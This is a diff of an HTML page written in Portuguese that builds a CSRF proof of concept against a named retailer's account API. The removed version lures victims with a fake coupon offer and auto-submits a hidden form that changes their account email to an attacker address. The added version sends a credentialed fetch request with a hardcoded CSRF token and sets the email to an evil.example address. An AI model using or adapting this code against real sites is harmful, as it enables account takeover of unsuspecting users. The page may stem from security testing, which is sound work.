@@ -1,18 +1,36 @@
 <!doctype html>
 <html lang="pt">
-<title>Confirme para ganhar cupom</title>
-<body>
-  <form id="f" action="https://www.expert.de/api/neo/frontend/_api/user/changeBasicUserData" method="POST" enctype="application/x-www-form-urlencoded">
-    <!-- JSON dentro de um campo único -->
-    <input type="hidden" name="userData" value='{"firstname":"Ana","lastname":"Silvana","email":"victima-pwned@evil.example","birthday":-86400000,"gender":"FEMALE"}'>
-    <!-- CSRF-token vai como header, mas o form NÃO consegue mandar header custom -->
-  </form>
-  <script>
-    /* não podemos mandar o header csrf-token, então teste rápido:
-       1. abra o link
-       2. veja se o servidor aceita SEM token (costuma dar 403)
-       3. se aceitar, vencemos; senão, pula para o plano B abaixo */
-    document.getElementById('f').submit();
-  </script>
-</body>
-</html>
+<title>Expert.de – CSRF PoC</title>
+<meta charset="utf-8">
+<body style="font-family:sans-serif;text-align:center;margin-top:20vh">
+  <h2>Clique abaixo para alterar o e-mail da sua conta</h2>
+  <button onclick="poc()">Executar CSRF</button>
+  <pre id="log"></pre>
+
+<script>
+function log(txt){document.getElementById('log').textContent+=txt+'\n';}
+
+function poc(){
+  log('Enviando...');
+  fetch('https://www.expert.de/api/neo/frontend/_api/user/changeBasicUserData',{
+    method:'POST',
+    credentials:'include',
+    headers:{
+      'Content-Type':'application/json',
+      'csrf-token':'722402ba-cab2-4fb4-bf4d-b79747753775'
+    },
+    body:JSON.stringify({
+      userData:{
+        firstname:'Ana',
+        lastname:'Silvana',
+        email:'csrf-poc@evil.example',
+        birthday:-86400000,
+        gender:'FEMALE'
+      }
+    })
+  })
+  .then(r=>{log('HTTP '+r.status); return r.text()})
+  .then(t=>log('Resposta: '+t))
+  .catch(e=>log('Erro: '+e));
+}
+</script>
